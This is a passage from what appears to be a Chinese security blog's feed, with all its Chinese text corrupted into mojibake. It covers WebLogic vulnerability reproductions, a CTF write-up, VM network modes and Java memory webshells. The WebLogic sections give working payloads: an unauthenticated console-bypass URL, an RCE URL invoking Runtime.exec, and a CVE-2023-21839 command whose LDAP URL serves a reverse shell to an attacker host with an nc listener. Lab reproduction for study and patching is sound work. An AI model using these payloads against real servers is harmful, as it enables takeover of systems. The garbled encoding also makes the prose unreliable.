id="2ã€æ¼æ´å½±å“-3"><a href="#2ã€æ¼æ´å½±å“-3" class="headerlink" title="2ã€æ¼æ´å½±å“"></a>2ã€æ¼æ´å½±å“</h3><ul><li>è¿œç¨‹ä»£ç æ‰§è¡Œï¼šæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶ã€‚</li><li>æœªç»èº«ä»½éªŒè¯çš„è®¿é—®ï¼šæ”»å‡»è€…æ— éœ€è¿›è¡Œèº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ã€‚</li></ul><h3 id="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-3"><a href="#3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-3" class="headerlink" title="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"></a>3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬</h3><ol><li>Oracle Weblogic Server 10.3.6.0.0</li><li>Oracle Weblogic Server 12.1.3.0.0</li><li>Oracle Weblogic Server 12.2.1.3.0</li><li>Oracle Weblogic Server 12.2.1.4.0</li><li>Oracle Weblogic Server 14.1.1.0.0</li></ol><h3 id="4ã€æ¼æ´å¤ç°-3"><a href="#4ã€æ¼æ´å¤ç°-3" class="headerlink" title="4ã€æ¼æ´å¤ç°"></a>4ã€æ¼æ´å¤ç°</h3><p>1ã€<code>http://xxx.xxx/console</code>è¿™é‡Œæ˜¯ç™»å½•é¡µé¢</p><p><img src="/img/VulnRep-WebLogic/image-20240517174515867.png" alt="image-20240517174515867"></p><p>2ã€æ„é€ pocæœªæˆæƒè®¿é—®åå°åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517175322311.png" alt="image-20240517175322311"></p><p>3ã€æ„é€ POCæ‰§è¡ŒRCE</p><p>åˆ›å»º<code>/tmp/1.txt</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.136:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/1.txt%27);%22)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240517183753482.png" alt="image-20240517183753482"></p><p>è¿›å…¥å®¹å™¨æŸ¥çœ‹ï¼Œåˆ›å»ºæˆåŠŸ</p><h3 id="5ã€æ¼æ´ä¿®å¤-3"><a href="#5ã€æ¼æ´ä¿®å¤-3" class="headerlink" title="5ã€æ¼æ´ä¿®å¤"></a>5ã€æ¼æ´ä¿®å¤</h3><p>å®‰è£…å®˜æ–¹æœ€æ–°è¡¥ä¸è¿›è¡Œå‡çº§ï¼š<a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p><h2 id="å…­ã€Weblogic-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2023-21839ï¼‰"><a href="#å…­ã€Weblogic-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2023-21839ï¼‰" class="headerlink" title="å…­ã€Weblogic è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE 2023-21839ï¼‰"></a>å…­ã€Weblogic è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE 2023-21839ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -4"><a href="#1ã€æ¼æ´åŸå› -4" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>WebLogic å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2023-21839&#x2F;CNVD-2023-04389ï¼‰ï¼Œç”±äºWeblogic IIOP&#x2F;T3åè®®å­˜åœ¨ç¼ºé™·ï¼Œå½“IIOP&#x2F;T3åè®®å¼€å¯æ—¶ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡IIOP&#x2F;T3åè®®ç½‘ç»œè®¿é—®æ”»å‡»å­˜åœ¨å®‰å…¨é£é™©çš„WebLogic Serverã€‚è¯¥æ¼æ´æ¶‰åŠåˆ° JNDI æ³¨å…¥ï¼Œå½“ JDK ç‰ˆæœ¬è¿‡ä½æˆ–è€…æœ¬åœ°å­˜åœ¨å°å·¥å…·æ—¶ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h3 id="2ã€æ¼æ´å½±å“-4"><a href="#2ã€æ¼æ´å½±å“-4" class="headerlink" title="2ã€æ¼æ´å½±å“"></a>2ã€æ¼æ´å½±å“</h3><p>é£é™©ç­‰çº§ï¼šå¥‡å®‰ä¿¡ CERT å°†æ­¤æ¼æ´çš„é£é™©ç­‰çº§è¯„å®šä¸º â€œé«˜å±â€ï¼Œå¹¶ç»™å‡ºäº† CVSS 3.1 è¯„åˆ†ä¸º 8.6ã€‚</p><h3 id="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-4"><a href="#3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬-4" class="headerlink" title="3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬"></a>3ã€æ¼æ´æ¶‰åŠç‰ˆæœ¬</h3><p>è¯¥æ¼æ´å½±å“ä»¥ä¸‹ç‰ˆæœ¬çš„ Oracle WebLogic Serverï¼š</p><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.2.1.2.0</li><li>Oracle WebLogic Server 12.2.1.1.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.0.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li><li>Oracle WebLogic Server 12.1.2.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li></ol><h3 id="4ã€æ¼æ´å¤ç°-4"><a href="#4ã€æ¼æ´å¤ç°-4" class="headerlink" title="4ã€æ¼æ´å¤ç°"></a>4ã€æ¼æ´å¤ç°</h3><p>1ã€ä½¿ç”¨nmap æ¢æµ‹æœ‰æ— å¼€å¯T3åè®®</p><p><img src="/img/VulnRep-WebLogic/image-20240518150255335.png" alt="image-20240518150255335"></p><p>2ã€åœ¨è¿™é‡Œä½¿ç”¨POC</p><p>åœ°å€ï¼š<a href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/4ra1n/CVE-2023-21839</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯¹main.go è¿›è¡Œç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cmd</span><br><span class="line">sudo apt install gccgo-go//å®‰è£…goè¯­è¨€</span><br><span class="line">go build -o CVE-2023-21839</span><br></pre></td></tr></table></figure><p>3ã€å¼€å¯ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1ã€å¼€å¯JNDI ç›‘å¬</span><br><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.126.130</span><br><span class="line">//2ã€å¼€å¯NCç›‘å¬</span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>4ã€è§¦å‘æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.126.128 -port 7001 -ldap ldap://192.168.126.130:1389/Basic/ReverseShell/192.168.126.130/1234</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240518153723.png" alt="image-20240518153723.png"></p><p>è·å–shell</p><h3 id="5ã€æ¼æ´ä¿®å¤-4"><a href="#5ã€æ¼æ´ä¿®å¤-4" class="headerlink" title="5ã€æ¼æ´ä¿®å¤"></a>5ã€æ¼æ´ä¿®å¤</h3><p>1ã€Oracle åœ¨ 2023 å¹´ 1 æœˆçš„å®‰å…¨å…¬å‘Šä¸­ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œè¡¥ä¸ä¸‹è½½é“¾æ¥ï¼š<a href="https://support.oracle.com/rs?type=doc&id=2917213.2">https://support.oracle.com/rs?type=doc&amp;id=2917213.2</a></p><p>2ã€ç¼“è§£æ–¹å¼ï¼šç¦ç”¨ T3 åŠ IIOP</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogicç³»åˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CTFç«èµ›ã€‘[NISACTF 2022]checkinâ€”çœ‹ä¸è§çš„å­—ç¬¦</title>
      <link href="/2024/05/17/CTF-competition-Invisible-characters/"/>
      <url>/2024/05/17/CTF-competition-Invisible-characters/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€CTFç«èµ›ã€‘-NISACTF-2022-checkinâ€”çœ‹ä¸è§çš„å­—ç¬¦"><a href="#ã€CTFç«èµ›ã€‘-NISACTF-2022-checkinâ€”çœ‹ä¸è§çš„å­—ç¬¦" class="headerlink" title="ã€CTFç«èµ›ã€‘[NISACTF 2022]checkinâ€”çœ‹ä¸è§çš„å­—ç¬¦"></a>ã€CTFç«èµ›ã€‘[NISACTF 2022]checkinâ€”çœ‹ä¸è§çš„å­—ç¬¦</h1><h2 id="ä¸€ã€çœ‹é¢˜"><a href="#ä¸€ã€çœ‹é¢˜" class="headerlink" title="ä¸€ã€çœ‹é¢˜"></a>ä¸€ã€çœ‹é¢˜</h2><p>å½“æˆ‘ä»¬å¤åˆ¶çš„æ—¶å€™ä¼šå˜æˆè¿™æ ·</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210427329.png" alt="image-20240517210427329"></p><p>æŠŠè¿™ä¸ªä»£ç å…¨éƒ¨å¤åˆ¶ç²˜è´´åˆ°phpæ–‡ä»¶ä¸­å»ï¼Œå‘ç°æœ‰å¥½å¤šå¥‡æ€ªçš„å­—ç¬¦å¯¼è‡´æˆ‘ä»¬ä¸èƒ½ä»¥æ­£å¸¸æ€è·¯å»çœ‹å¾…ä»£ç </p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210613255.png" alt="image-20240517210613255"></p><h2 id="äºŒã€è§£é¢˜"><a href="#äºŒã€è§£é¢˜" class="headerlink" title="äºŒã€è§£é¢˜"></a>äºŒã€è§£é¢˜</h2><h3 id="1ã€è·å–å‚æ•°å"><a href="#1ã€è·å–å‚æ•°å" class="headerlink" title="1ã€è·å–å‚æ•°å"></a>1ã€è·å–å‚æ•°å</h3><p>å°†PHPæ–‡ä»¶åˆ° 010 æˆ–è€… WinHex ä¸­æ‰“å¼€</p><p>å¤åˆ¶æˆ‘ä»¬éœ€è¦æ•°æ®çš„åå…­è¿›åˆ¶ä»£ç ï¼Œå¦‚ï¼šæˆ‘ä»¬éœ€è¦çŸ¥é“GETæ¥æ”¶çš„å‚æ•°ååˆ°åº•æ˜¯è°</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517210814023.png" alt="image-20240517210814023"></p><p>åœ¨åå…­è¿›åˆ¶çš„å‰é¢éƒ½åŠ ä¸Šä¸€ä¸ª%ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦è¦æäº¤çš„å‚æ•°åäº†</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211213521.png" alt="image-20240517211213521"></p><h3 id="2ã€è·å–å‚æ•°å€¼"><a href="#2ã€è·å–å‚æ•°å€¼" class="headerlink" title="2ã€è·å–å‚æ•°å€¼"></a>2ã€è·å–å‚æ•°å€¼</h3><p>åŒæ ·çš„æ–¹æ³•è·å–éœ€è¦çš„å‚æ•°å€¼</p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211626414.png" alt="image-20240517211626414"></p><p><img src="/img/CTF-competition-Invisible-characters/image-20240517211615280.png" alt="image-20240517211615280"></p><h3 id="3ã€ä¼ å‚"><a href="#3ã€ä¼ å‚" class="headerlink" title="3ã€ä¼ å‚"></a>3ã€ä¼ å‚</h3><p>ç»“åˆèµ·æ¥åŠ ä¸Šå‰é¢çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFç«èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘ç®€è¿°è™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œè¿æ¥æ¨¡å¼</title>
      <link href="/2024/05/11/Nouns-Virtual-Machine-Network/"/>
      <url>/2024/05/11/Nouns-Virtual-Machine-Network/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€åŸºç¡€çŸ¥è¯†ã€‘ç®€è¿°è™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œè¿æ¥æ¨¡å¼"><a href="#ã€åŸºç¡€çŸ¥è¯†ã€‘ç®€è¿°è™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œè¿æ¥æ¨¡å¼" class="headerlink" title="ã€åŸºç¡€çŸ¥è¯†ã€‘ç®€è¿°è™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œè¿æ¥æ¨¡å¼"></a>ã€åŸºç¡€çŸ¥è¯†ã€‘ç®€è¿°è™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œè¿æ¥æ¨¡å¼</h1><p>ç½‘ç»œå®‰å…¨ä¸­ï¼Œè™šæ‹Ÿæœºæ˜¯å¿…ä¸å¯å°‘çš„å­˜åœ¨ï¼Œäº†è§£è™šæ‹Ÿæœºçš„ç½‘ç»œè¿æ¥æ¨¡å¼æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚ä½†ç½‘ä¸Šå¯¹æ­¤çš„è®²è§£è¿‡äºç¹çå’Œéš¾ä»¥ç†è§£ï¼Œåœ¨æ­¤ç”¨å›¾å’Œç®€çŸ­çš„è¯­å¥å†™ä¸‹æœ¬äººçš„ç†è§£ï¼Œä»¥å¸®åŠ©åˆšå…¥è¡Œçš„åŒå­¦å¿«é€ŸæŒæ¡ã€‚</p><h2 id="ä¸€ã€æ¡¥æ¥æ¨¡å¼"><a href="#ä¸€ã€æ¡¥æ¥æ¨¡å¼" class="headerlink" title="ä¸€ã€æ¡¥æ¥æ¨¡å¼"></a>ä¸€ã€æ¡¥æ¥æ¨¡å¼</h2><p>ç±»ä¼¼è™šæ‹Ÿå‡ºæ¥ä¸€ä¸ªäº¤æ¢æœºï¼ˆVmnet0ï¼‰ï¼ŒåŒæ—¶æŠŠç‰©ç†ä¸»æœºå’Œæ‰€æœ‰çš„æ¡¥æ¥è™šæ‹Ÿæœºéƒ½æ’åœ¨è¿™ä¸ªäº¤æ¢æœºä¸­ï¼Œæ­¤æ—¶æ¡¥æ¥æ¨¡å¼çš„è™šæ‹Ÿæœºå’Œä¸»æœºåŒå¤„ä¸€ä¸ªç½‘æ®µä¸”å­ç½‘æ©ç ã€ç½‘å…³ä¸DNSéƒ½ä¸ä¸»æœºä¸€æ¨¡ä¸€æ ·ã€‚</p><p>çœ‹å¦‚å›¾ï¼š</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt="è™šæ‹Ÿæœº-æ¡¥æ¥æ¨¡å¼"></p><p>ç®€è€Œè¨€ä¹‹ï¼šæ¡¥æ¥ç±»å‹çš„è™šæ‹Ÿæœºå’Œä¸»æœºä¸€èµ·åŒå¤„ä¸€ä¸ªå±€åŸŸç½‘ä¸­ï¼Œä¸ä¸»æœºä½¿ç”¨çš„ç›¸åŒçš„ç½‘å¡ã€å­ç½‘æ©ç ã€ç½‘å…³ã€DNSã€‚æ­¤æ—¶ï¼Œä¸»æœºå¯ä»¥è®¿é—®äº’è”ç½‘ï¼Œè™šæ‹Ÿæœºä¹Ÿå¯ä»¥è®¿é—®åˆ°äº’è”ç½‘ã€‚</p><h2 id="äºŒã€NATæ¨¡å¼"><a href="#äºŒã€NATæ¨¡å¼" class="headerlink" title="äºŒã€NATæ¨¡å¼"></a>äºŒã€NATæ¨¡å¼</h2><p>ç›¸å½“äºNATæ¨¡å¼çš„è™šæ‹Ÿæœºæ˜¯è¿æ¥åœ¨äº¤äº’æœºï¼ˆVmnet8ï¼‰ä¸Šé¢çš„ï¼Œè€Œä¸»æœºçš„VMWare Network Adapter Vmnet8ä¹Ÿä¼šè¿æ¥åˆ°Vmnet8ï¼Œç”¨æ¥ä¸»æœºè·ŸNATè™šæ‹Ÿæœºé€šè®¯ï¼›æ­¤æ—¶NATè™šæ‹Ÿæœºå¯ä»¥é€šè¿‡å®¿ä¸»ä¸»æœºæ‰€åœ¨çš„ç½‘ç»œè®¿é—®äº’è”ç½‘ã€ä»¥åŠå®¿ä¸»ä¸»æœºèƒ½è®¿é—®åˆ°çš„ä¸€åˆ‡ç½‘ç»œã€‚</p><p>çœ‹å¦‚å›¾ï¼š</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-NAT%E6%A8%A1%E5%BC%8F.png" alt="è™šæ‹Ÿæœº-NATæ¨¡å¼"></p><p>ç®€è€Œè¨€ä¹‹ï¼šNATç±»å‹çš„è™šæ‹Ÿæœºä½¿ç”¨çš„æ˜¯ä¸»æœºçš„ç½‘å¡ï¼Œå¯ä»¥æ¥ç†è§£ä¸ºâ€œä¸»æœºè‚šå­é‡Œçš„è›”è™«â€ã€‚æ­¤æ—¶ï¼Œä¸»æœºå¦‚ä½•ä¸Šç½‘ï¼Œè™šæ‹Ÿæœºå°±å¦‚ä½•ä¸Šç½‘ï¼Œä¸»æœºèƒ½è®¿é—®åˆ°çš„æœºå™¨ï¼Œè™šæ‹Ÿæœºä¹Ÿèƒ½è®¿é—®çš„åˆ°ã€‚ä½†æ˜¯ä¸»æœºä¹‹å¤–çš„å…¶ä»–æœºå™¨æ˜¯ä¸èƒ½è®¿é—®åˆ°NATæœºå™¨çš„ã€‚</p><h2 id="ä¸‰ã€ä»…ä¸»æœºæ¨¡å¼"><a href="#ä¸‰ã€ä»…ä¸»æœºæ¨¡å¼" class="headerlink" title="ä¸‰ã€ä»…ä¸»æœºæ¨¡å¼"></a>ä¸‰ã€ä»…ä¸»æœºæ¨¡å¼</h2><p>ä¸NATæ¨¡å¼å·®ä¸å¤šï¼Œä½†æ˜¯æ˜¯ä½¿ç”¨VMware Network Adapter VMnet1è™šæ‹Ÿç½‘å¡è¿æ¥VMnet1è™šæ‹Ÿäº¤æ¢æœºæ¥ä¸è™šæ‹Ÿæœºé€šä¿¡çš„ï¼Œä¸”ä¸å¤–ç½‘éš”ç¦»ï¼Œä¸èƒ½ä¸Šç½‘ï¼Œä½¿ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿæœºæˆä¸ºè¢«å¤–ç•Œéš”ç¦»çš„ä¸»æœºã€‚å½“ç„¶ï¼Œæ­¤æ—¶é™¤äº†ä¸»æœºèƒ½è®¿é—®åˆ°ä¹‹å¤–ï¼ŒNATåˆ©ç”¨ä¸»æœºèƒ½è®¿é—®çš„æœºå™¨ä¹Ÿèƒ½è®¿é—®åˆ°çš„ç‰¹æ€§ï¼Œä¹Ÿæ˜¯å¯ä»¥è®¿é—®ä»…ä¸»æœºæœºå™¨çš„ï¼›ä½†æ˜¯ä»…ä¸»æœºæœºå™¨æ˜¯è®¿é—®ä¸åˆ°NATè™šæ‹Ÿæœºçš„ã€‚</p><p>çœ‹å¦‚å›¾ï¼š</p><p><img src="/img/Nouns-Virtual-Machine-Network/%E8%99%9A%E6%8B%9F%E6%9C%BA-%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F.png" alt="è™šæ‹Ÿæœº-ä»…ä¸»æœºæ¨¡å¼"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è™šæ‹Ÿæœºç½‘ç»œè¿æ¥æ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å†…å­˜é©¬ã€‘JavaWeb å†…å­˜é©¬åˆè¯†ä¸æ£€æµ‹</title>
      <link href="/2024/04/29/Red-Team-Invasion-Memory-Horse/"/>
      <url>/2024/04/29/Red-Team-Invasion-Memory-Horse/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å†…å­˜é©¬ã€‘JavaWeb-å†…å­˜é©¬åˆè¯†ä¸æ£€æµ‹"><a href="#ã€å†…å­˜é©¬ã€‘JavaWeb-å†…å­˜é©¬åˆè¯†ä¸æ£€æµ‹" class="headerlink" title="ã€å†…å­˜é©¬ã€‘JavaWeb å†…å­˜é©¬åˆè¯†ä¸æ£€æµ‹"></a>ã€å†…å­˜é©¬ã€‘JavaWeb å†…å­˜é©¬åˆè¯†ä¸æ£€æµ‹</h1><h1 id="ä¸€ã€å†…å­˜é©¬åˆè¯†"><a href="#ä¸€ã€å†…å­˜é©¬åˆè¯†" class="headerlink" title="ä¸€ã€å†…å­˜é©¬åˆè¯†"></a>ä¸€ã€å†…å­˜é©¬åˆè¯†</h1><p>éšç€æ”»é˜²æ¼”ç»ƒè¶Šæ¼”è¶Šçƒˆï¼Œæµé‡åˆ†æã€EDRã€WAFã€é˜²æŠ¤è½¯ä»¶ç­‰è¶Šæ¥è¶Šå¤šçš„è®¾å¤‡è¢«å¹¿æ³›ä½¿ç”¨ï¼Œä¼ ç»Ÿçš„åŸºäºæ–‡ä»¶ä¸Šä¼ å¼çš„webshell å·²ç»è¶Šæ¥è¶Šå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œåœ¨è¿™äº›å®‰å…¨è®¾å¤‡é¢å‰å‡ ä¹æ— å¤„éå½¢ã€‚</p><p>Webshellå†…å­˜é©¬ï¼Œæ˜¯åœ¨å†…å­˜ä¸­å†™å…¥æ¶æ„åé—¨å’Œæœ¨é©¬å¹¶æ‰§è¡Œï¼Œè¾¾åˆ°è¿œç¨‹æ§åˆ¶WebæœåŠ¡å™¨çš„ä¸€ç±»å†…å­˜é©¬ï¼Œé‡‡ç”¨æ— æ–‡ä»¶çš„æ–¹æ³•ç›´æ¥æ³¨å…¥åˆ°å†…å­˜ä¸­ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚ä¸éœ€è¦ä¾èµ–äºæ–‡ä»¶ï¼Œä»è€Œèº²é¿æ€è½¯ï¼Œç»™æ£€æµ‹å¸¦æ¥å·¨å¤§çš„éš¾åº¦ã€‚</p><h1 id="äºŒã€å†…å­˜é©¬çš„åˆ†ç±»"><a href="#äºŒã€å†…å­˜é©¬çš„åˆ†ç±»" class="headerlink" title="äºŒã€å†…å­˜é©¬çš„åˆ†ç±»"></a>äºŒã€å†…å­˜é©¬çš„åˆ†ç±»</h1><ol><li>Servletå‹å†…å­˜é©¬ï¼šServletã€Filterã€Listener</li><li>æ¡†æ¶ç±»å‹å†…å­˜é©¬ï¼šSpring Controllerã€Interceptor</li><li>Agentç±»å‹å†…å­˜é©¬</li><li>å…¶ä»–â€¦â€¦</li></ol><h1 id="ä¸‰ã€Servlet-ç±»å‹"><a href="#ä¸‰ã€Servlet-ç±»å‹" class="headerlink" title="ä¸‰ã€Servlet ç±»å‹"></a>ä¸‰ã€Servlet ç±»å‹</h1><h2 id="1ã€Java-Web-ä¸‰å¤§ç»„ä»¶ä»‹ç»"><a href="#1ã€Java-Web-ä¸‰å¤§ç»„ä»¶ä»‹ç»" class="headerlink" title="1ã€Java Web ä¸‰å¤§ç»„ä»¶ä»‹ç»"></a>1ã€Java Web ä¸‰å¤§ç»„ä»¶ä»‹ç»</h2><p>Servletã€Filterã€Listener æ˜¯JavaWeb çš„ä¸‰å¤§ç»„ä»¶ï¼Œæœ‰å…³è¿™ä¸‰ä¸ªç»„ä»¶å¦‚ä¸‹è¿›è¡Œç®€å•çš„è¯´æ˜ï¼š</p><ol><li>Servletï¼šå¤„ç†http è¯·æ±‚çš„ä¸šåŠ¡é€»è¾‘ã€‚</li><li>Filterï¼šå¯¹httpçš„è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æ•æ„Ÿå­—ç¬¦ç­‰ã€‚è¿‡æ»¤å®Œè¯·æ±‚åå†æŠŠè¯·æ±‚è½¬äº¤ç»™Servletã€‚</li><li>Listenerï¼šJavawebä¸­çš„ç›‘å¬å™¨ï¼Œå¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·è®¿é—®é‡ï¼Œç»Ÿè®¡ç½‘ç«™çš„æ€»è®¿é—®é‡ç­‰ã€‚</li></ol><h2 id="2ã€ä¸‰å¤§ç»„ä»¶çš„è¿è¡Œé¡ºåº"><a href="#2ã€ä¸‰å¤§ç»„ä»¶çš„è¿è¡Œé¡ºåº" class="headerlink" title="2ã€ä¸‰å¤§ç»„ä»¶çš„è¿è¡Œé¡ºåº"></a>2ã€ä¸‰å¤§ç»„ä»¶çš„è¿è¡Œé¡ºåº</h2><p>å½“Javaweb è¿è¡Œèµ·æ¥ä¹‹åï¼ŒListener æœ€å…ˆè¿›è¡Œç›‘å¬ç›´åˆ°Javaweb åœæ­¢è¿è¡Œï¼Œä¹‹åå½“æœ‰httpè¯·æ±‚çš„è¯ï¼ŒFilter ä¼šå¯¹è¯·æ±‚è¿›è¡Œè„±æ•ï¼Œå†å°†è¯·æ±‚è½¬äº¤ç»™Servletï¼ŒServletå¤„ç†å®Œè¯·æ±‚ä¹‹åï¼Œå“åº”å†æ¬¡æ¥åˆ°Filterè„±æ•ï¼Œä¹‹åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><h2 id="3ã€å†…å­˜é©¬çš„åŸç†"><a href="#3ã€å†…å­˜é©¬çš„åŸç†" class="headerlink" title="3ã€å†…å­˜é©¬çš„åŸç†"></a>3ã€å†…å­˜é©¬çš„åŸç†</h2><p>Servlet ç±»å‹çš„å†…å­˜é©¬çš„åŸç†å¤§åŒå°å¼‚ï¼Œå…¶éƒ½ä¼šé€šè¿‡getServletContext() å‡½æ•°è·å–â€contextâ€œ çš„å±æ€§å€¼ï¼Œå¹¶è®¾ç½®å¯ä¿®æ”¹çš„å±æ€§ã€‚ä¹‹åå®šä¹‰filter è¿‡æ»¤å™¨ï¼Œæ‹¦æˆªè¯·æ±‚ï¼Œæ£€æµ‹è¯·æ±‚å‚æ•°ä¸­æ˜¯å¦æœ‰æœ¨é©¬å‚æ•°ï¼Œå¦‚cmdï¼Œè‹¥æœ‰ï¼Œåˆ™æ‰§è¡Œæœ¨é©¬å‘½ä»¤ï¼Œæ²¡æœ‰åˆ™æ­£å¸¸æ”¾è¡Œã€‚</p><h1 id="å››ã€Spring-ç±»å‹"><a href="#å››ã€Spring-ç±»å‹" class="headerlink" title="å››ã€Spring ç±»å‹"></a>å››ã€Spring ç±»å‹</h1><h2 id="1ã€Sprintå°è°ˆ"><a href="#1ã€Sprintå°è°ˆ" class="headerlink" title="1ã€Sprintå°è°ˆ"></a>1ã€Sprintå°è°ˆ</h2><p>Spring å¯ä»¥ç®€å•çœ‹ä½œæ˜¯æŠŠJavawebä¸‰å¤§ç»„ä»¶ç»“åˆèµ·æ¥çš„æ¡†æ¶ï¼Œä½¿ç”¨MVCæ¶æ„ ï¼ˆModelã€Viewã€Controllerï¼‰ã€‚æ­¤æ¶æ„ä¸­HTTP çš„æœ€ç»ˆè¯·æ±‚æ˜¯åœ¨Controller ä¸­å®ç°ã€‚</p><h2 id="2ã€Springå†…å­˜é©¬"><a href="#2ã€Springå†…å­˜é©¬" class="headerlink" title="2ã€Springå†…å­˜é©¬"></a>2ã€Springå†…å­˜é©¬</h2><p>è·ŸServlet ç±»å‹çš„å·®ä¸å¤šï¼Œéƒ½æ˜¯æ‹¿åˆ°â€contextâ€œ çš„å±æ€§å€¼ï¼Œå¹¶åŠ¨æ€çš„æ·»åŠ ä¸€ä¸ªControllerï¼Œä¹‹åæ˜ å°„åˆ°å†…å­˜åœ°å€ï¼Œè·å–è¯·æ±‚å‚æ•°å®ç°æ¶æ„ä»£ç 